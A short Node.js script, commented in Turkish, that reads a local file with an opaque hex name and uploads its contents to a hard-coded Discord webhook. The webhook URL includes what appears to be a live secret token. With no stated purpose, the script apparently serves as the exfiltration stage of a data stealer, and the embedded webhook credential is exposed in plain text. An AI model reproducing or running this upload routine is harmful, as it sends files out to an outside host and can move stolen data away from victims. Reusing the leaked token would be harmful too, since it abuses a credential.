const fs = require('fs');
const https = require('https');
const path = require('path');

const filePath = path.join(__dirname, '9AA6E459D7B29E77BEEC69E1F5F2C6C3.txt');
const url = 'https://discordapp.com/api/webhooks/1113158568741441618/mnvfcgVDEEzK9sy3ECvZeFo6OzdRV8gVzbiuv48dqCkrP5nIs0KfDZSst3GW_6ubNNNl';

const boundary = '--------------------------' + Date.now().toString(16);

const formData = `
--${boundary}\r
Content-Disposition: form-data; name="file"; filename="9AA6E459D7B29E77BEEC69E1F5F2C6C3.txt"\r
Content-Type: text/plain\r
\r
${fs.readFileSync(filePath, 'utf-8')}\r
--${boundary}--
`;

const options = {
  method: 'POST',
  headers: {
    'Content-Type': `multipart/form-data; boundary=${boundary}`,
    'Content-Length': Buffer.byteLength(formData),
  },
};

const req = https.request(url, options, (res) => {
  console.log(`Dosya gönderme isteği gönderildi, yanıt kodu: ${res.statusCode}`);
  // Yanıtı işleme devam edebilirsiniz...
});

req.on('error', (error) => {
  console.error('Dosya gönderme isteği gönderilirken bir hata oluştu:', error.message);
});

req.write(formData);
req.end();
